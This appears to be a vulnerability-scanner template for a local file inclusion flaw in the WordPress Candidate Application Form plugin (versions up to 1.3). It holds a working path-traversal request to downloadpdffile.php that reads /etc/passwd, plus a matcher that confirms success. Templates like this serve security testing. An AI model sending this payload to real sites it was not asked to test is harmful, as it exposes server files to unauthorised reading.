id: candidate-application-lfi
info:
  author: dhiyaneshDK
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  description: WordPress Candidate Application Form <= 1.3 is susceptible to arbitrary
    file downloads because the code in downloadpdffile.php does not do any sanity
    checks.
  name: WordPress Candidate Application Form <= 1.3 - Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/446233e9-33b3-4024-9b7d-63f9bb1dafe0
  severity: high
  tags: wordpress,wp-plugin,lfi,wp
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd'
